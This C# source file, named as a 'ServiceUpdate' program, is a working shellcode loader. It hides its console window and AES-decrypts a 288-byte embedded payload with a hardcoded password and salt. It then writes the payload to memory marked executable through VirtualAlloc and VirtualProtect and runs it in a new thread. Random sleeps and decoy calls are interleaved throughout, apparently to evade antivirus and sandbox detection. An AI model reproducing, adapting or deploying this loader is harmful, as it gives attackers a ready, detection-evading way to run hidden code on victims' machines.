using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.IO;
using System.Text;
using System.Security.Cryptography;

namespace ServiceUpdate
{
    class Update
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32")]
        private static extern bool VirtualFree(UInt32 lpAddress, UInt32 size, UInt32 dwFreeType);

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("kernel32.dll")]
        private static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);

        const int SW_HIDE = 0;

        static void Main()
        {
            UInt32 MEM_COMMIT = 0x1000;
            UInt32 PAGE_READWRITE = 0x04;
            UInt32 PAGE_EXECUTE_READ = 0x20;

            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);

            
            byte[] passwordBytes = Encoding.UTF8.GetBytes("schloop691000");
            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

            byte[] aesshellcode = new byte[288] {0xcc,0x0a,0x7f,0x6a,0x30,0xb6,0x8f,0xd6,0x35,0x73,0xd4,0xcb,0x70,0x6e,0xb9,0x30,0x64,0x27,0x92,0xda,0x16,0x0e,0x9d,0x03,0x2a,0x73,0x3a,0xee,0x16,0x64,0x5c,0xf1,0x36,0x2b,0x23,0x90,0x13,0x4f,0x37,0x04,0xb6,0xea,0xe8,0x36,0x31,0x27,0x67,0x51,0xcc,0x2b,0x90,0x05,0x93,0xab,0x94,0x81,0x15,0xef,0x3d,0xf2,0xf7,0x3f,0x0b,0xc4,0x96,0x5c,0x1e,0xc6,0xaf,0xb3,0xc4,0x34,0x13,0x97,0x7c,0x0d,0x86,0xac,0x01,0xd4,0x4d,0x63,0x00,0x24,0x90,0x3d,0xf2,0xa5,0x9b,0xdc,0xe6,0x24,0xc4,0x8b,0xde,0x4e,0xf0,0xa8,0x69,0xaf,0x27,0x68,0x01,0xc0,0x8e,0x3b,0x03,0x58,0xef,0xa5,0xfd,0xff,0x79,0xe0,0x35,0x7a,0x75,0x3f,0xc8,0xa0,0x67,0xb9,0x2e,0x11,0xac,0x75,0xb2,0x6a,0x5f,0x20,0x60,0x3a,0x4e,0x40,0x0e,0x0d,0x0d,0x0f,0xfe,0xf2,0xc9,0x9c,0xa7,0xfb,0x0e,0x28,0x96,0x9e,0x08,0x1a,0x46,0xab,0xd0,0x49,0x48,0xc8,0x4b,0x62,0x78,0x74,0xaa,0x94,0x44,0xae,0xea,0xa2,0x81,0x24,0x3b,0x43,0xe5,0x29,0x42,0x9b,0x6b,0x3f,0xb4,0x97,0xb4,0x7f,0x29,0x2e,0xdf,0x04,0x36,0xd9,0x52,0x3e,0xad,0x77,0x71,0x10,0x8a,0xf9,0x1e,0xda,0xf7,0xb2,0xb0,0xfa,0x2d,0x2c,0x72,0xae,0x8d,0xc2,0xc4,0xfd,0x74,0xfd,0xf7,0x15,0x5c,0x59,0x1d,0x68,0x90,0x1d,0x2d,0x20,0xd9,0x39,0xd2,0xd8,0x65,0x3c,0x7a,0xf7,0xdb,0xa7,0x1a,0xd2,0xab,0x38,0x0a,0x6c,0x5f,0x2a,0xa0,0xcd,0xaf,0x11,0x20,0x88,0x34,0x67,0x12,0x33,0xcd,0xf0,0x1f,0x9b,0xe9,0x22,0x76,0x9e,0xf7,0x4c,0x45,0x68,0xa5,0x57,0x59,0x9a,0x74,0xbe,0x3a,0x8a,0x15,0x4c,0x2e,0x3e,0x9b,0x51,0x96,0x31,0x11,0x0e,0x05,0x41,0x13,0xf2,0x3c,0x56,0x92,0x62,0x0c,0x61};

            byte[] salt = new byte[] {16, 243, 252, 139, 162, 9, 107, 165, 41, 4, 178, 216, 252, 126, 26, 188};

            byte[] service = AES_Decrypt(aesshellcode, passwordBytes, salt);

            RandomSleep();
            ExecuteRandomFunction();

            IntPtr funcAddr = VirtualAlloc(IntPtr.Zero, (UInt32)service.Length, MEM_COMMIT, PAGE_READWRITE);

            RandomSleep();
            ExecuteRandomFunction();

            Marshal.Copy(service, 0, funcAddr, service.Length);

            RandomSleep();
            ExecuteRandomFunction();

            UInt32 oldProtect;
            VirtualProtect(funcAddr, (UInt32)service.Length, PAGE_EXECUTE_READ, out oldProtect);

            RandomSleep();
            ExecuteRandomFunction();

            UInt32 threadId = 0;
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, funcAddr, IntPtr.Zero, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }

        static void RandomSleep()
        {
            Random rnd = new Random();
            int sleepInterval = rnd.Next(1000, 5000);
            Thread.Sleep(sleepInterval);
        }

        public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes, byte[] salt)
        {
            byte[] decryptedBytes = null;

            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;
                    AES.Padding = PaddingMode.PKCS7;

                    using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                        cs.Close();
                    }
                    decryptedBytes = ms.ToArray();
                }
            }

            return decryptedBytes;
        }

        static void ExecuteRandomFunction()
        {
            Random rnd = new Random();
            int functionIndex = rnd.Next(1, 5);

            switch (functionIndex)
            {
                case 1:
                    GetProcessId();
                    break;
                case 2:
                    GetSystemTime();
                    break;
                case 3:
                    GetTickCount();
                    break;
                case 4:
                    GetEnvironmentVariable();
                    break;
            }
        }

        static void GetProcessId()
        {
            int processId = Process.GetCurrentProcess().Id;
        }

        static void GetSystemTime()
        {
            DateTime systemTime = DateTime.Now;
        }

        static void GetTickCount()
        {
            int tickCount = Environment.TickCount;
        }

        static void GetEnvironmentVariable()
        {
            string userProfile = Environment.GetEnvironmentVariable("USERPROFILE");
        }
    }
}